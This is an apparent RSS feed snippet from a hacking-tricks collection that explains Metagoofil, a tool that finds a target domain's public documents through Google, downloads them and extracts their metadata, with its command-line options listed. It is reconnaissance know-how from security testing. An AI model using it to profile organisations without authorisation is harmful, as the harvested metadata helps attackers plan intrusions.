+Tricks ### Metagoofil ```bash # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \&amp;#34;yes\&amp;#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.</description>
     </item>
     
   </channel>
